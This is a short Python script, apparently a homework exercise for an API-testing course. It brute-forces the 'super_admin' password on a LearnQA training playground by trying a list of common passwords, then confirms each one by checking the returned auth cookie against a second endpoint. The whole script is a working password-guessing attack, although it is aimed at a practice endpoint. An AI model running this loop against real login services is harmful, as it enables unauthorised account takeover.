import requests

list_password = ['123456', '123456789', 'qwerty', 'password', '1234567', '12345678',
'12345', 'iloveyou', '111111', '123123', 'abc123', 'qwerty123', '1q2w3e4r', 'admin',
'qwertyuiop', '654321', '555555', 'lovely', '7777777',
'welcome', '888888', 'princess',
'dragon', 'password1', '123qwe']

url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
url2 = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

for i in list_password:
    payload = {"login": "super_admin", "password": f"{i}"}
    response = requests.post(url, data=payload)

    if response.status_code == 200:
        auth_cookie = response.cookies.get('auth_cookie')

        payload2 = {"auth_cookie": f"{auth_cookie}"}
        response2 = requests.post(url2, cookies=payload2)

        if response2.text != "You are NOT authorized":
            print(f"Верный пароль - '{i}'")
            print(response2.text)
